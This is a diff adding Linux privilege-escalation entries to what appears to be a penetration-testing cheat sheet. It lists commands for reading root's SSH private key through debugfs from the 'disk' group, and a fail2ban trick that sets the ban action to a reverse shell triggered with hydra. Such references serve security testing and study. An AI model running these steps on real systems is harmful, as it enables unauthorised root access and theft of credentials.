@@ -4325,6 +4325,22 @@ Docker Container Escape via SNMP
       ```
    3. ATTACKER: `snmpwalk -v2c -c 53cur3M0NiT0riNg 192.168.190.113 nsExtendOutput1`
 
+#### <ins>User groups</ins>
+- If your user is part of the group `disk`:
+  1. `df -h`
+  2. `debugfs /dev/sd[a-z][1-9]`  example: `sda1`
+  3. `debugfs: cat /root/.ssh/id_rsa`
+- group `video`: [HackTricks | Video Group](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#video-group)
+
+#### <ins>fail2ban</ins>
+- See: "[Privilege Escalation with fail2ban nopasswd](https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49)"
+- fail2ban config: `/etc/fail2ban/jail.conf`
+- ```
+  /etc/fail2ban/action.d/iptables-multiport.conf
+  actionban = reverse shell
+  ```
+- trigger the ban with hydra
+
 ### <ins>Windows Privilege Escalation</ins>
 
 #### <ins>Checklist</ins>
